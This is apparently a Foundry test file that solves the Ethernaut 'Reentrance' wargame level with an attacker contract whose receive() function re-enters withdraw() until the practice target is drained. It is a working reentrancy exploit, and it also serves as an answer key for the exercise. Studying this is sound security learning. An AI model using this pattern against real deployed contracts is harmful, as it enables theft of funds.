// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Reentrance.sol";

// implement withdraw() in receive() or fallback() s.t. calling withdraw() triggers reentrancy
contract MiddleMan {
    Reentrance public prey;
    uint256 amount;

    function attack(address payable _prey) public payable {
        prey = Reentrance(_prey);
        amount = msg.value;
        prey.donate{value: amount}(address(this));
        prey.withdraw(amount);
    }

    receive() external payable {
        prey.withdraw(amount);
    }
}

// when the prey contract runs out of ether, address.call() fails and doesn't invoke the attacker's receive() further
contract ReentranceTest is Test {
    Reentrance instance;
    uint256 initialBalance = 1 ether;

    function setUp() public {
        instance = new Reentrance();

        address(instance).call{value: initialBalance}("");
        assertEq(address(instance).balance, initialBalance);
    }

    function test() public {
        MiddleMan middleMan = new MiddleMan();
        assertEq(address(middleMan).balance, 0);
        assertEq(instance.balanceOf(address(middleMan)), 0);

        uint256 donateAmount = 0.1 ether;
        middleMan.attack{value: donateAmount}(payable(address(instance)));

        assertEq(address(middleMan).balance, initialBalance + donateAmount);
        // tho the last call fails and doesn't invoke receive(), donateAmount is still subtracted from that loop
        assertEq(
            instance.balanceOf(address(middleMan)),
            type(uint256).max - initialBalance - donateAmount + 1
        );
    }
}
